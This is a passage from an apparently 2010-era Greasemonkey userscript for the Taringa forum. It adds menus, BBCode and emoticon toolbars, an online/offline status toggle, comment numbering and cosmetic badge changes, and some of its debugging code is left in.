	menu += '	<li><a href="/mensajes/" title="Casilla de Mensajes"><img src="'+(Mensajes? MenuMensajesLleno:MenuMensajesVacio)+'" style="width: '+MenuSize+'px; height: '+MenuSize+'px;" align="absmiddle"  alt="X" border="0"/>'+(Mensajes? '<span style="margin-left: 5px; font-size: 12px;">'+$('a[href="/mensajes/"]:first').find('span:first').html()+'</span>':'')+ '</a>';
    menu += '	<ul class="tSubMenu"><b>Casilla de Mensajes</b>';
    menu += '		<li><a href="/mensajes/enviados/">Mensaje Enviados</a></li>';
    menu += '		<li><a href="/mensajes/eliminados/">Mensaje Eliminados</a></li>';
    menu += '		<li><a href="/mensajes/redactar/">Escribir Mensaje</a></li>';
    menu += '	</ul>';
	menu += '	</li>';
//----Monitor----//
	menu += '	<li style="position: relative;" class="monitor">';
	menu += '		<a name="Monitor" onclick="notifica.last(); return false" href="/monitor/" title="Monitor de Posts"><img src="'+MenuMonitor+'" style="width: '+MenuSize+'px; height: '+MenuSize+'px;" align="absmiddle" alt="X" border="0"/></a>';
	menu += '		<div class="notificaciones-list">';
	menu += '			<div style="padding: 10px 10px 0 10px;font-size:13px">';
	menu += '				<strong onclick="location.href=\'/monitor/\'" style="cursor:pointer">Notificaciones</strong>';
	menu += '			</div>';
	menu += '			<ul></ul>';
    menu += '			<a class="ver-mas" href="/monitor/">Ver m&aacute;s notificaciones</a>';
    menu += '		</div>';
	menu += '	</li>';
//----Borradores----//
	menu += '	<li><a href="/mis-borradores/" title="Mis Borradores"><img src="'+MenuBorradores+'" style="width: '+MenuSize+'px; height: '+MenuSize+'px;" align="absmiddle" alt="X" border="0"/></a></li>';
//----Favoritos----//
	menu += '	<li><a href="/favoritos.php" title="Favoritos"><img src="'+MenuFavoritos+'" style="width: '+MenuSize+'px; height: '+MenuSize+'px;" align="absmiddle" alt="X" border="0"/></a></li>';
//----Cuenta----//
	menu += '	<li><a href="/cuenta/" title="Mi Cuenta"><img src="'+MenuCuenta+'" style="width: '+MenuSize+'px; height: '+MenuSize+'px;" align="absmiddle" alt="X" border="0"/></a></li>';
//----Mi Perfil----//
	menu += '	<li><a href="/perfil.php" title="Mi Perfil">'+user+'</a>';
    menu += '	<ul class="tSubMenu"><b>Mi Perfil</b>';
    menu += '		<li><a href="http://buscar.taringa.net/posts?q=autor'+encodeURIComponent(':'+user)+'&en=todo">Mis Posts</a></li>';
	menu += '		<li><a href="http://buscar.taringa.net/comunidades?type=temas&q=*&autor='+user+'">Mis Temas</a></li>';
    var url_busqueda_posts = user+'+'+hoy.getDate()+'.'+(hoy.getMonth()+1)+'.'+hoy.getFullYear()+' site:taringa.net';
	menu += '		<li><a href="http://buscar.taringa.net/web?q='+url_busqueda_posts+'">Mis últimos comentarios</a></li>';
	menu += '	</ul>';
	menu += '	</li>';
//----Logout----//
	menu += '	<li><a href="/logout.php?key='+datospag.user_key+'" title="Cerrar Sesión"><img src="'+MenuCerrarSesion+'" style="width: '+MenuSize+'px; height: '+MenuSize+'px;" align="absmiddle" alt="X" border="0"/></a></li>';
//----Opciones----//
	menu += '	<li style="-moz-border-radius-topright: 7px;"><a href="" id="Sharkale_Opciones" title="Opciones Avanzadas del Script"><img src="'+MenuOpciones+'" style="width: '+MenuSize+'px; height: '+MenuSize+'px;" align="absmiddle" alt="OPCIONES" /></a></li>';
	menu += '<div style="clear: both;"></div></div>';
	$('span[class="menu_centro"]:first').remove();
	$('span[class="menu_izq"]:first').remove();
	$('div[class="opciones_usuario"]:first').html(menu);
	
	$('#tabbedCapsula').remove();
	
	menu = '<li id="tabbedScript" class="tabbed">';
	menu += '	<a href="http://www.taringa.net/comunidades/bbcoder/" title="Entrar a la Comunidad del Script®" style="">Script <img alt="Drop Down" src="http://i.t.net.ar/images/arrowdown.png"></a>';
	menu += '</li>';
	
	$('#menu .menuTabs .clearBoth').before(menu);
	
	var submenu = '<div id="subMenuScript" class="subMenu" style="display: none;">';
	submenu += '<ul class="floatL tabsMenu">';
	submenu += '	<li><a title="Comunidad Oficial del Script®" href="http://www.taringa.net/comunidades/scriptsbbcoders/">Comunidad Oficial</a></li>';
	submenu += '	<li><a title="Página Oficial del Script®" href="http://www.sharkale.com.ar/bbcoder/" target="_blank">P&aacute;gina Oficial</a></li>';
	submenu += '	<li><a title="Listado de Packs de Emoticones" href="http://www.sharkale.com.ar/bbcoder/index.php?id=emot_list" target="_blank">Packs de Emoticones</a></li>';
	submenu += '	<li><a title="Crear un Packs de Emoticones" href="http://www.sharkale.com.ar/bbcoder/index.php?id=emot_crear" target="_blank">Crear Pack de Emoticones</a></li>';
	submenu += '	<li><a title="Crear un Packs de Emoticones" href="http://www.sharkale.com.ar/bbcoder/faq/index.php" target="_blank">Ayuda</a></li>';
	submenu += '	<li><a title="Radio Sharkale®" href="http://www.sharkale.com.ar/" target="_blank">Radio Sharkale&reg;</a></li>';
	submenu += '	<div class="clearBoth"></div>';
	submenu += '</ul>';
	submenu += '<div class="clearBoth"></div>';
	submenu += '</div>';
	
	/*****************************************
	PARA EL MENEJO DEL BOTON online/offline
	*****************************************/
function actualizarOpcionesUsuario(opciones){

var estado;
var parametros = 'save=6&ajax=1&key='+unsafeWindow.global_data.user_key+'&';
var opcion_actual;

	for(var i=0;i < opciones.length;i++){
		opcion_actual = opciones[i];

		if (opcion_actual == "on"){
			if (i==0){
				parametros += 'mostrar_estado_checkbox=on&';
			}else if (i==1){
				parametros += 'participar_busquedas=on&';
			}else if (i==2){
				parametros += 'recibir_boletin_semanal=on&';
			}else{
				parametros += 'recibir_promociones=on&';
			}
		}
		
	}

		$.ajax({
				type: 'POST',
				url: 'http://www.taringa.net/cuenta.php',
				dataType: 'text',
				data: parametros,
				success: function(h){
				
					$('#imgonlineoffline').attr("src",function() {  
                        var hrefvivo   = 'http://s3.subirimagenes.com:81/emoticonos/previo/thump_4862793bul186.gif';  
                        var hrefmuerto = 'http://s2.subirimagenes.com/emoticonos/previo/thump_48705234862805bul187.gif';  

                        if (opciones[0] == "off"){  
                            GM_setValue("mostarMiEstado",false);  
                            estado = 'desconectado.';  
                            return hrefmuerto;  
                        }else{  
                            GM_setValue("mostarMiEstado",true);  
                            estado = 'conectado.';  
                            return hrefvivo;  
                        }  
                });

								
					//alert('Tu estado ahora es '+estado);	
										
				},
				error: function(h){
				
				}
			});
		

}

function cambiarEstadoOnlineOffline(){
var opciones_usuario = new Array(4);
	
			$.ajax({
				type: 'GET',
				url: 'http://www.taringa.net/cuenta/',
				dataType: 'text',
				data: '',
				success: function(h){
					var respuesta = $('<div id="respuesta">'+h+'</div>').find('.cuenta-save-6');
					//Me guardo todas las opciones del usuario
					
					for(var i=0;i < respuesta.size();i++){
						var check_actual = respuesta.eq(i).attr("checked");
						
							if (i==0){
								if (check_actual == true){
									opciones_usuario[i] = "off";
								}else{
									opciones_usuario[i] = "on";
								}
							}else{//El resto de las opciones las dejo igual
								if (check_actual == true){
									opciones_usuario[i] = "on";
								}else{
									opciones_usuario[i] = "off";
								}
							}
						
						//alert(check_actual+" y "+opciones_usuario[i]);
											
					}//del for
					
					
					actualizarOpcionesUsuario(opciones_usuario);
					
										
				},
				error: function(h){
				
				}
			});
		
}

//Cuando hagan click en Online/Offline lo cambio - Manejador de evento de click en boton
$('#Menu_Online_Offline').click(function() {
		cambiarEstadoOnlineOffline();			
});


/*************************************
*
*	Monitor de Post
*
*************************************/

function cargarPostsFecha(fecha,usuario){

//q=yasserock%2B24.11.2010+site%3Ataringa.net#982;
//yasserock+24.11.2010 site:taringa.net

//    http://buscar.taringa.net/web?q=yasserock+24.11.2010+site:taringa.net
var datos_buscar =  '+'+fecha+'+'+'site:taringa.net';
//var datos_buscar2 = encodeURIComponent('yasserock+24.11.2010+site:taringa.net');
var url_prueba = 'http://www.google.com/cse';
var datos_prueba = "q="+encodeURIComponent('yasserock+24.11.2010+site:taringa.net');
var posts = new Array();




var datos_ahora_si = 'op=getPageContent&buscar='+encodeURIComponent('yasserock+24.11.2010+site:taringa.net');
var url_ahora_si = 'http://sandinosaso.webcindario.com/taringa/scripts/ajaxController.php';	
			
			/*
			$.ajax({
				type: 'GET',
				url: 'http://buscar.taringa.net/posts?q=autor:sandinosaso',
				dataType: 'text',
				data: datos_ahora_si,
				success: function(h){
					var respuesta = $('<div id="respuesta">'+h+'</div>').find('#results');
					alert('Exito. Respuesta:'+respuesta);
					
					for(var i=0;i < respuesta.size();i++){
							var li_actual = respuesta.eq(i);
						
							posts[i] = li_actual;
							
							alert("Actual:"+li_actual);
						
						//alert(check_actual+" y "+opciones_usuario[i]);
											
					}//del for
									
										
				},
				error: function(h){
					alert('Error en get de posts intente mas tarde:'+h.status);
				}
			});
			
			*/
			
			$.ajax({
			type: 'GET',
			url: 'http://'+Dom+'/api/shark32455Dfa/json/Users-GetUserData/'+perfilde,
			success: function(h){
						var userdata = new Function("return "+h)();
						var sexo = userdata['profile']['sex'];
						var pais = userdata['profile']['country'].replace(/amp;/g,'');
						alert('sexo:'+sexo+' pais:'+pais);
						$('.basicData').prepend('<li><strong> Sexo:</strong> <span>'+sexo+'</span></li><li><strong> País:</strong> <span>'+pais+'</span></li>');
						$('.sendMsg').after('<div class="sendMsg"><a title="Verificar estado en linea del usuario" href="" onclick="verificar_estado(\''+perfilde+'\',\''+(sexo == 'Masculino'? 'm':'f')+'\'); return false;">Verificar Estado</a></div>');
			},
			error: function(h){
				alert('error:'+h);
				$('.sendMsg').after('<div class="sendMsg"><a title="Verificar estado en linea del usuario" href="" onclick="verificar_estado(\''+perfilde+'\',\'a\'); return false;">Verificar Estado</a></div>');
			}
			});
			
			
			
			
}

//Cuando hagan click en Online/Offline lo cambio - Manejador de evento de click en boton
$('#Menu_Monitor_Posts').click(function() {
		cargarPostsFecha('24.11.2010','yasserock');			
});






	$('.subMenuContent').append(submenu);
	
	var enMP = false;
	var enMC = false;
	var enMS = false;
	var enSM = false;
	var enSMFade = false;
	$('#tabbedComunidades').mouseenter(function(){
		$.timer(100,function(timer){
			timer.stop();
			enMC = true;
			if(enSMFade || $('#subMenuComunidades').is(':visible')) return; else enSMFade = true;
			$('#subMenuComunidades').fadeIn('slow');
			if($('#subMenuPosts').is(':visible')) $('#subMenuPosts').fadeOut(500,function(){enSMFade = false});
			if($('#subMenuScript').is(':visible')) $('#subMenuScript').fadeOut(500,function(){enSMFade = false});
		});
	}).mouseleave(function(){
		$.timer(110,function(timer){
			timer.stop();
			enMC = false;
		});
	});
	$('#tabbedPosts').mouseenter(function(){
		$.timer(100,function(timer){
			timer.stop();
			enMP = true;
			if(enSMFade || $('#subMenuPosts').is(':visible')) return; else enSMFade = true;
			$('#subMenuPosts').fadeIn('slow');
			if($('#subMenuComunidades').is(':visible')) $('#subMenuComunidades').fadeOut(500,function(){enSMFade = false});
			if($('#subMenuScript').is(':visible')) $('#subMenuScript').fadeOut(500,function(){enSMFade = false});
		});
	}).mouseleave(function(){
		$.timer(110,function(timer){
			timer.stop();
			enMP = false;
		});
	});
	$('#tabbedScript').mouseenter(function(){
		$.timer(100,function(timer){
			timer.stop();
			enMS = true;
			//GM_log(enSMFade);
			if(enSMFade || $('#subMenuScript').is(':visible')) return; else enSMFade = true;
			if($('#subMenuPosts').is(':visible')) $('#subMenuPosts').fadeOut(500,function(){enSMFade = false});
			if($('#subMenuComunidades').is(':visible')) $('#subMenuComunidades').fadeOut(500,function(){enSMFade = false});
			$('#subMenuScript').fadeIn('slow');
		});
	}).mouseleave(function(){
		$.timer(110,function(timer){
			timer.stop();
			enMS = false;
		});
	});
	
	$('.subMenuContent').mouseenter(function(){
		enSM = true;
	}).mouseleave(function(){
		enSM = false;
		if(enSMFade) return; else enSMFade = true;
		$.timer(150,function(timer){
			timer.stop();
			var SA = unsafeWindow.menu_section_actual;
			if(SA == 'Posts'){
				//GM_log('4a')
				if((enMC && $('#subMenuComunidades').is(':visible')) || (enMS && $('#subMenuScript').is(':visible'))){
					enSMFade = false;
				}else if((enMS && $('#subMenuComunidades').is(':visible')) || (enMC && $('#subMenuScript').is(':visible'))) {
					//GM_log('4a1')
					if($('#subMenuComunidades').is(':visible')) {
						$('#subMenuComunidades').fadeOut(500,function(){enSMFade = false});
						$('#subMenuScript').fadeIn(500);
					}else{
						$('#subMenuScript').fadeOut(500,function(){enSMFade = false});
						$('#subMenuComunidades').fadeIn(500);
					}
				}else if(!$('#subMenuPosts').is(':visible')){
					//GM_log('4a2')
					$('#subMenuPosts').fadeIn(500);
					if($('#subMenuComunidades').is(':visible')) $('#subMenuComunidades').fadeOut(500,function(){enSMFade = false});
					if($('#subMenuScript').is(':visible')) $('#subMenuScript').fadeOut(500,function(){enSMFade = false});
				}else enSMFade = false;
			}else{
				//GM_log('4b')
				if((enMP && $('#subMenuPosts').is(':visible')) || (enMS && $('#subMenuScript').is(':visible'))) {
					enSMFade = false;
				}else if((enMS && $('#subMenuPosts').is(':visible')) || (enMP && $('#subMenuScript').is(':visible'))){
					//GM_log('4b1')
					if($('#subMenuPosts').is(':visible')) {
						$('#subMenuPosts').fadeOut(500,function(){enSMFade = false});
						$('#subMenuScript').fadeIn(500);
					}else{
						$('#subMenuScript').fadeOut(500,function(){enSMFade = false});
						$('#subMenuPosts').fadeIn(500);
					}
				}else if(!$('#subMenuComunidades').is(':visible')){
					//GM_log('4b2')
					$('#subMenuComunidades').fadeIn(500);
					if($('#subMenuPosts').is(':visible')) $('#subMenuPosts').fadeOut(500,function(){enSMFade = false});
					if($('#subMenuScript').is(':visible')) $('#subMenuScript').fadeOut(500,function(){enSMFade = false});
				}else enSMFade = false;
			}
		});
	});
	
	setTimeout("jQuery('.userInfoLogin ul.tSubMenu a').tipsy({gravity: 'e'});",100);
	
	$.timer(500,function(){
		if(enSMFade||enSM) return; else enSMFade = true;
		if(!enSM && !enMP && !enMC && !enMS){
			var SA = unsafeWindow.menu_section_actual;
			if(SA == 'Posts' && !$('#subMenuPosts').is(':visible')){
				//GM_log('0a');
				$('#subMenuPosts').fadeIn(500);
				if($('#subMenuComunidades').is(':visible')) $('#subMenuComunidades').fadeOut(500,function(){enSMFade = false});
				if($('#subMenuScript').is(':visible')) $('#subMenuScript').fadeOut(500,function(){enSMFade = false});
			}else if(SA == 'Comunidades' && !$('#subMenuComunidades').is(':visible')){
				//GM_log('0b');
				$('#subMenuComunidades').fadeIn(500);
				if($('#subMenuPosts').is(':visible')) $('#subMenuPosts').fadeOut(500,function(){enSMFade = false});
				if($('#subMenuScript').is(':visible')) $('#subMenuScript').fadeOut(500,function(){enSMFade = false});
			}else enSMFade = false;
		}else if(enMP && ($('#subMenuComunidades').is(':visible') || $('#subMenuScipt').is(':visible'))){
			//GM_log('1');
			$('#subMenuPosts').fadeIn(500);
			if($('#subMenuComunidades').is(':visible')) $('#subMenuComunidades').fadeOut(500,function(){enSMFade = false});
			if($('#subMenuScript').is(':visible')) $('#subMenuScript').fadeOut(500,function(){enSMFade = false});
		}else if(enMC && ($('#subMenuPosts').is(':visible') || $('#subMenuScipt').is(':visible'))){
			//GM_log('2');
			$('#subMenuComunidades').fadeIn(500);
			if($('#subMenuPosts').is(':visible')) $('#subMenuPosts').fadeOut(500,function(){enSMFade = false});
			if($('#subMenuScript').is(':visible')) $('#subMenuScript').fadeOut(500,function(){enSMFade = false});
		}else if(enMS && ($('#subMenuPosts').is(':visible') || $('#subMenuComunidades').is(':visible'))){
			//GM_log('3');
			$('#subMenuScript').fadeIn(500);
			if($('#subMenuPosts').is(':visible')) $('#subMenuPosts').fadeOut(500,function(){enSMFade = false});
			if($('#subMenuComunidades').is(':visible')) $('#subMenuComunidades').fadeOut(500,function(){enSMFade = false});
		}else enSMFade = false;
	});
	
}

///////////////------------------Ejecucion--------------------////////////////////
GM_addStyle('#clima h1{font-size:20px;}#modalBody label {display:inline!important;}');
document.imagen = new Image;
document.imagen.src = URL+'cargando.gif';
document.imagen2 = new Image;
document.imagen2.src = urlimg+'cargando.gif';
AgregarFuncionesenWeb();
if(Tar && path != 'principal'){
	GM_addStyle('.search-in a{color:#FFFFFF}.search_active{color:#FFFF00!important} .mini_bbuscador{background-image: url("'+urlimg+'busc_der.png")}');
	$('#banner').html('<form action="http://buscar.taringa.net/posts" class="buscador-h" name="top_search_box"><div class="search-in"><a onclick="search_set(this, \'web\')" class="">Web</a> - <a onclick="search_set(this, \'posts\')" class="search_active" >Posts</a> - <a class="" onclick="search_set(this, \'comunidades\')">Comunidades</a></div><div style="clear: both;"><img src="'+urlimg+'busc_izq.png" class="mini_leftIbuscador"><input type="text" id="ibuscadorq" name="q" onkeypress="ibuscador_intro(event)" onfocus="onfocus_input(this)" onblur="onblur_input(this)" value="Buscar" title="Buscar" class="mini_ibuscador value"><input vspace="2" type="submit" hspace="10" align="top" value="" alt="Buscar" class="mini_bbuscador" title="Buscar"></div></form>');
}else $('#banner').remove();
$('div[class*="banner"]').remove();
$('#subMenuPosts ul li:last,#subMenuComunidades ul li:last').after('<li><a id="solapa_clima" title="Ver el Clima" href="/clima/">Clima</a></li><li><a title="Block de Notas" onclick="block_notas();return false;" href="">Notas</a></li><li><a title="Chat del Script" onclick="chat_script();return false;" href="">Chat</a></li>');
$('#subMenuComunidades .filterCat span').remove();
$('#subMenuComunidades .filterCat select').css('margin','0').parent().css('width','210px');
$('#subMenuPosts .filterCat').remove();
if(NovatosPrinc){$('a[title=Novatos]').parent().remove()};
$('#Sharkale_Opciones').click(function() {
	unsafeWindow.mydialog.procesando_inicio("Cargando interfaz...","Opciones Avanzadas del Script");
	$.timer(500, function (timer) {
		timer.stop();
		Sharkale_Opciones();
		unsafeWindow.mydialog.close();
	});
	return false;
});

var regComu = /\/comunidades\/(bbcoder|ps2games|steamoficial|4chan|canallamania|scriptsbbcoders)\//gi;
}
$(document).ready(function(){
GM_addStyle('.especial2 .comment-box, blockquote.especial2, div.citacuerpo.especial2 {-moz-box-shadow:0 0 10px #004000;border:1px solid #004000;}blockquote {-moz-border-radius:5px;}\
			#post-comentarios .miComentario .answerTxt {width:862px !important;margin-left:13px;}#post-comentarios #body_comm{margin-bottom:0px;}.answerTxt .Container{-moz-border-radius:5px 5px 5px 5px; width: 640 px !important}.comment-box{-moz-border-radius:5px 5px 0 0;}.comment-info {-moz-border-radius:5px 5px 0 0;}');
switch(path) {
case 'post':
	///////////////-----------------Agregar FullScreenMode------------------////////////////////
	modificar_posts();
	$('.avatarBox').css('height','auto');
	$('#post-comentarios div:has(img[alt=Bloquear Usuario])').css('height','auto');
	$('div[id^=div_cmnt][class!=especial1]:has(div.avatar-box a[href=/perfil/'+user+'])').addClass('especial2');
	$('strong:contains("'+user+'")').parent().parent().addClass('especial2');
	///////////////------------------Modificar Agregar Comentario--------------------////////////////////
	if($('.miComentario').size() != 0){
		$('.miComentario .error').css('font-weight','bold').css('width','820px').css('margin-left','75px');
		$('.comment-info div.floatR ul').append('<li><a href="#maincontainer" title="Ir a la Cielo"><img src="'+urlimg+'arriba.png"/></a></li><li><a href="#pie-a" title="Ir a la Tierra"><img src="'+urlimg+'abajo.png"/></a></li>');
		if($('.titulorespuestas.floatL').html() == '0 Comentarios') $('#comentarios div:last').html($('#comentarios div:last').html().replace(", Soyez le premier", ''));
		else{
			GM_addStyle('.avatar-box li.administrar a:hover span {background-position:0 -64px;}');
			var users_com = $('.avatar-box ul');
			var nick_user,id_user;
			for(var i=0;i<users_com.size();i++){
				nick_user = users_com.eq(i).find('li:eq(0) a').attr('href').split('/')[3];
				id_user   = /[0-9]+$/.exec(users_com.eq(i).find('li:eq(1)').attr('class'));
				users_com.eq(i).append('<li class="administrar"><a href="/buscador-taringa.php?autor='+nick_user+'" target="_blank">Sus posts<span></span></a></li><li class="administrar"><a href="http://buscar.taringa.net/comunidades?type=temas&q=*&autor='+nick_user+'" target="_blank">Sus temas<span></span></a></li><li class="administrar"><a href="/perfil/'+nick_user+'/comentarios" target="_blank">Sus comentarios<span></span></a></li><li class="administrar"><a href="" onclick="notifica.follow(\'user\', '+id_user+', notifica.userInPostHandle, null);return false;" target="_blank">Seguir Usuario<span></span></a></li>');
			}
		}
		if(!Tar) GM_addStyle("#post-comentarios .miComentario .answerInfo {width:52px;}.comentario-post {width:940px!important}.avatar-box img {border:1px solid #CCCCCC;display:block;padding:1px;}.comment-box{margin-left:15px;}");
		///////////////-------------------------Agregar BBCodes--------------------------////////////////////
		$.timer(100,function(timer){
			timer.stop();
			$('.markItUpHeader').html('<div style="width:640px;float:left;height:50px"><span style="float:left;text-align:left;">'+CrearBarraBBC()+'</span></div><div style="float:right;">'+CrearBarraColores()+'</div>');
			unsafeWindow.$('.autogrow').unbind('focus').unbind('blur').css('overflow','auto');
			var resizeHandle = $('<div class="markItUpResizeHandle"></div>').bind("mousedown", function(e) {
				var h = $('#body_comm').height(), y = e.clientY, mouseMove, mouseUp;
				mouseMove = function(e) {$('#body_comm').css("height", Math.max(20, e.clientY+h-y)+"px");return false;};
				mouseUp = function(e) {unsafeWindow.$("html").unbind("mousemove", mouseMove).unbind("mouseup", mouseUp);return false;};
				unsafeWindow.$("html").bind("mousemove", mouseMove).bind("mouseup", mouseUp);
			});
			$('.markItUpFooter').css('clear','both').css('width','720px').css('margin-bottom','10px').append(resizeHandle);
			///////////////-----------------Agregar Opciones en Comentarios------------------////////////////////		
			if(PunFav == true){
				if($('.dar-puntos').size() != 0 && $('.post-acciones').size() != 0){
					var acciones = $('.post-acciones');
					acciones.find('li').css('float','left').css('margin-right','5px');
					$('.markitcomment').prepend('<div align="center" style="font-weight:bold"><span class="dar-puntos">'+$('.dar-puntos').html()+'</span>'+acciones.html()+'<div class="clearfix"/></div><hr class="divider"/>');
				}
			}
			$('#post').html('<div id="gif_cargando" align="center"><img src="'+URL+'cargando.gif"/></div>');
		});
		///////////////-----------------------Agregar Emoticones-------------------------////////////////////
		$('#body_comm').css('min-height','283px').css('width','720px').css('height','283px');
		BotonOcultar = '<input class="button" value="Mostrar/Ocultar Emoticones" onclick="$(\'#Sharkale_TaringaEmoticones\').toggle(\'blind\');" type="button" title="Mostrar/Ocultar la barra de emoticones rápidos">';
		$('div[class="buttons"]').html('<span style="float:left;"><input type="button" value="Ver Preview del Comentario" class="button" title="Ver Preview del Comentario" onclick="preview()">'+BotonOcultar+'</span><span id="seccion_enviar" style="float:right;"><input class="button" type="button" tabindex="2" value="Enviar Comentario" onclick="add_comment(\'true\')"/></span>'+CrearBarraEmoticones()+'<br>');
	}
	GM_addStyle('#gif_cargando {margin-left:150px;margin-bottom:10px;display:none;}');
	$('.titulorespuestas').append(' <a href="" onclick="act_comment($(\'a[class=here]:first\').html());return false;"> <img src="'+urlimg+'act_comment.png" class="carg_act_comm" title="Actualizar Comentarios" height="15" align="absmiddle" style="margin-left:5px;"/></a> <input type="button" class="button" value="Mostrar/Ocultar Comentarios" title="Mostrar/Ocultar Comentarios" onclick="$(\'#comentarios\').toggle(\'show\')">');
	if(HideComment) $('#comentarios').hide();
	///////////////------------------Agregar Boton Ir Abajo--------------------////////////////////
	if($('.post-title').size() > 0){
		$('a[href="#cielo"]').attr('id','pie-a').removeClass('irCielo').attr('href','#maincontainer').html('<img src="'+urlimg+'arriba.png" title="Ir al Cielo"/>').before('<a href="#post-comentarios" title="Ir al Medio"><img src="'+urlimg+'medio_arriba.png"/></a> ');
		var Tierra = '<span style="vertical-align: middle;float: right;padding-top: 1px;padding-right: 30px">';
		Tierra += (!LinkCheck? '<a href="" id="linkchecker" title="Verificar disponibilidad de los links"><img src="'+urlimg+'link.png" /></a> ':'')+'<a href="#post-comentarios" title="Ir al Medio"><img src="'+urlimg+'medio_abajo.png"/></a> <a href="#pie-a" title="Ir a la Tierra"><img src="'+urlimg+'abajo.png"/></a></span>';
		$('.post-title:eq(0)').html(Tierra + '<span style="vertical-align: middle;padding-top: 1px;">' + $('.post-title:eq(0)').html()+ '</span>');
		$('.dar-puntos:eq(0)').before('<span style="float:right"><a id="medio" href="#maincontainer" title="Ir a la Cielo"><img src="'+urlimg+'arriba.png"/></a> <a href="#pie-a" title="Ir a la Tierra"><img src="'+urlimg+'abajo.png"/></a></span>');
	}
	//--Numeración de comentarios--//
	var n_com_ini = 100 * parseInt($('a[class=here]:first').html()) - 100 || 0;
	var n_com = $('.comment-info .nick');for(var i=0;i < n_com.size();i++){n_com.eq(i).before('#'+(i+n_com_ini+1)+' - ');}
	if($('span[class="given-name"]').html() == "Sharkale"){
		var mod_sharkale = $('span[class="given-name"]').parent().parent();
		mod_sharkale.html(mod_sharkale.html().replace(/New Full User/gi,'Ultra Mega User'));
		mod_sharkale.find("div[class=metadata-usuario] span:eq(0)").append('4684');
		$('img[title="Ultra Mega User"]').attr('style','position: absolute; top: -703px; clip: rect(703px, 16px, 720px, 0px);').removeAttr('alt');
		mod_sharkale = $('img[title="Ultra Mega User"]').parent().attr('id','icon_shark').clone();
		mod_sharkale.find('img[title="Ultra Mega User"]').attr('style','position: absolute; top: -109px; clip: rect(109px, 16px, 126px, 0px);').attr('title','Sharkale® La envidia de los Mods...');
		$('#icon_shark').after(mod_sharkale);
	}
	if($('span[class="given-name"]').html() == "yasserock"){
		var mod_sharkale = $('span[class="given-name"]').parent().parent();
		mod_sharkale.html(mod_sharkale.html().replace(/New Full User/gi,'Ultra Mega VIP User'));
		mod_sharkale.find("div[class=metadata-usuario] span:eq(0)").append('134');
		$('img[title="Ultra Mega VIP User"]').attr('style','position: absolute; top: -703px; clip: rect(703px, 16px, 720px, 0px);').removeAttr('alt');
		mod_sharkale = $('img[title="Ultra Mega VIP User"]').parent().attr('id','icon_shark').clone();
		mod_sharkale.find('img[title="Ultra Mega VIP User"]').attr('style','position: absolute; top: -109px; clip: rect(109px, 16px, 126px, 0px);').attr('title','yasserock La envidia de los Mods...');
		$('#icon_shark').after(mod_sharkale);
	}
	if($('span[class="given-name"]').html() == "luckyy196"){
		var mod_sharkale = $('span[class="given-name"]').parent().parent();
		mod_sharkale.html(mod_sharkale.html().replace(/New Full User/gi,'Full User T!'));
		$('img[title="Full User T!"]').attr('style','position: absolute; top: -703px; clip: rect(703px, 16px, 720px, 0px);').removeAttr('alt');
		mod_sharkale = $('img[title="Full User T!"]').parent().attr('id','icon_shark').clone();
		mod_sharkale.find('img[title="Full User T!"]').attr('style','position: absolute; top: -109px; clip: rect(109px, 16px, 126px, 0px);').attr('title','luckyy196 La envidia de los Mods...');
		$('#icon_shark').after(mod_sharkale);
	}
	GM_addStyle('#post-comentarios{width:940px}.comment-box{width:860px;}#post-comentarios .comentarios-title {margin-left:75px;width:862px;}.paginadorCom{width:862px!important;}');
	$('.paginadorCom div[style]').css('width','620px');
	$('.avatar-48').attr('width','56').attr('height','56');
	$('.before a[class!=desactivado]').click(function(){unsafeWindow.act_comment((parseInt($('a[class=here]:first').html())-1));return false;});
	$('.next a[class!=desactivado]').click(function(){unsafeWindow.act_comment((parseInt($('a[class=here]:first').html())+1));return false;});
	var botonera = $('.paginadorCom').find('li');
	var lb;
	for(var i=0;i < botonera.size();i++){
		lb = botonera.eq(i).find('a');
		lb.click(function(){unsafeWindow.act_comment(this.innerHTML);return false;});
	}
	break;
case 'edicion':
	$(':button[tabindex="8"]').after('&nbsp;&nbsp;<input class="button" onclick="if(show_preview(this.form.titulo.value, this.form.cuerpo.value, this.form.tags.value, this.form, true)) document.forms.newpost.submit()" style="font-size: 15px;" value="Postear Sin Previsualizar" title="Postear Sin Previsualizar" type="button">');
	///////////////------------------Agregar BBCodes--------------------////////////////////
	$.timer(1,function(timer){
		timer.stop();
		$('div[class="markItUpHeader"]:first').html(CrearBarraBBC());
		var catid = $("select[name=categoria]:first").attr('value');
		$("select[name='categoria']:first").wrap('<div id="categoriasScript">');
		var html = '<br><label><span class="categoriaPost" style="width:50px"><input type="radio" name="categoria" value="-1" checked="">Elija una Categor&iacute;a</label></span>';
		if(Tar){
			for (var i = 3; i < CategoriasT.length; i=i+3) {
				html += '<label><span class="categoriaPost '+CategoriasT[i+1]+'" style="width:50px"><input type="radio" name="categoria" value="'+CategoriasT[i]+'">'+CategoriasT[i+2]+'</label></span>';
			}
		}else{
			for (var i = 3; i < CategoriasP.length; i=i+3) {
				html += '<label><span class="categoriaPost '+CategoriasP[i+1]+'" style="width:50px"><input type="radio" name="categoria" value="'+CategoriasP[i]+'">'+CategoriasP[i+2]+'</label></span>';
			}
		}
		$('#categoriasScript').html(html);
		$(':radio[name=categoria][value='+catid+']').attr('checked','checked');
		///////////////--------------Contador de caracteres--------------------////////////////////
		$('b:contains("Mensaje del post"):first').append(' (Caracteres: [Total: <span style="color:green"><span id="c_tot">'+(txt.textLength)+'</span>/63200</span> | Restantes: <span id="c_rest" style="color:green">'+(63200-txt.textLength)+'</span>])');
		$(document).mouseup(function(){
			$.timer(100, function(timer2){
				timer2.stop();
				$('#c_tot').html($('#markItUp').val().length);
				$('#c_rest').html(63200-$('#markItUp').val().length);
			});
		});
		$('#markItUp').keyup(function(){
			$('#c_tot').html($('#markItUp').val().length);
			$('#c_rest').html(63200-$('#markItUp').val().length);
		});
		setTimeout("jQuery('.markItUpHeader img').tipsy({gravity: 's'});",100);
	});
	///////////////--------------Verificador de titulo--------------------////////////////////
	$('input[name=titulo]').keyup(function(){if ($(this).val().length >= 5 && unsafeWindow._capsprot($(this).val()) > 75) $('.capsprot').show();	else $('.capsprot').hide();});
	///////////////--------------Agregar Emoticones y Coloringa--------------------////////////////////
